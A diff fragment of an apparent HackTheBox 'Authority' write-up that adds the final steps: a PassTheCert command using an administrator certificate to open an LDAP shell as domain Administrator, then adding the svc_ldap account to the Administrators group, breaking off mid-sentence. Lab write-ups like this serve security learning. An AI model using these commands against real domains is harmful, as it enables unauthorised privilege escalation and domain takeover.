@@ -571,5 +571,18 @@ I need both of these separately to perform this
 https://github.com/AlmondOffSec/PassTheCert
 
 ```python
+python3 passthecert.py -action ldap-shell -crt ../../administrator.crt -key ../../administrator.key -domain authority.htb -dc-ip 10.129.229.56
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+Type help for list of commands
+
+# whoami
+u:HTB\Administrator
 ```
+I can get a more stable shell by using some built in commands
+
+```python
+# add_user_to_group svc_ldap Administrators
+Adding user: svc_ldap to group Administrators result: OK
+```
+Now when i reconnect via winrm i should get 
